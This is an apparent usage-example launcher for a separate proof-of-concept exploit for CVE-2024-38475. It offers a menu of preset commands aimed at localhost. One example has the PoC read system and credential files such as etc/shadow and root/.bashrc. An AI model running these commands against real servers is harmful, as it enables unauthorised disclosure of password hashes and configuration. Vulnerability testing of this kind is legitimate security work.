#!/usr/bin/env python3
"""
CVE-2024-38475 PoC Usage Examples
Simple examples of how to use the Python PoC script
"""

import subprocess
import sys
import os

def run_command(cmd, description):
    """Run a command and display results"""
    print(f"\n{'='*60}")
    print(f"Example: {description}")
    print(f"Command: {cmd}")
    print(f"{'='*60}")
    
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.stdout:
            print("STDOUT:")
            print(result.stdout)
        
        if result.stderr:
            print("STDERR:")
            print(result.stderr)
            
        print(f"Exit code: {result.returncode}")
        
    except Exception as e:
        print(f"Error running command: {e}")

def main():
    print("CVE-2024-38475 Python PoC Usage Examples")
    print("=" * 50)
    
    # Check if PoC file exists
    poc_file = "cve-2024-38475-poc.py"
    if not os.path.exists(poc_file):
        print(f"Error: {poc_file} not found in current directory")
        sys.exit(1)
    
    # Basic usage examples
    examples = [
        {
            "cmd": f"python3 {poc_file} --help",
            "desc": "Show help and usage information"
        },
        {
            "cmd": f"python3 {poc_file} -u http://localhost",
            "desc": "Basic vulnerability test against localhost"
        },
        {
            "cmd": f"python3 {poc_file} -u http://localhost -v",
            "desc": "Verbose output with detailed information"
        },
        {
            "cmd": f"python3 {poc_file} -u http://localhost -f etc/passwd,etc/shadow,root/.bashrc",
            "desc": "Test specific custom files"
        },
        {
            "cmd": f"python3 {poc_file} -u http://localhost -o vulnerability_report.txt",
            "desc": "Generate detailed report file"
        },
        {
            "cmd": f"python3 {poc_file} -u http://localhost -t 5 -v",
            "desc": "Set custom timeout (5 seconds) with verbose output"
        }
    ]
    
    print("\nAvailable examples:")
    for i, example in enumerate(examples, 1):
        print(f"{i}. {example['desc']}")
    
    print(f"\nChoose an example to run (1-{len(examples)}) or 'q' to quit:")
    
    while True:
        choice = input("> ").strip().lower()
        
        if choice == 'q':
            print("Goodbye!")
            break
        
        try:
            choice_num = int(choice)
            if 1 <= choice_num <= len(examples):
                example = examples[choice_num - 1]
                run_command(example['cmd'], example['desc'])
                
                print(f"\nChoose another example (1-{len(examples)}) or 'q' to quit:")
            else:
                print(f"Invalid choice. Please enter 1-{len(examples)} or 'q'")
        except ValueError:
            print(f"Invalid input. Please enter a number (1-{len(examples)}) or 'q'")

if __name__ == "__main__":
    main()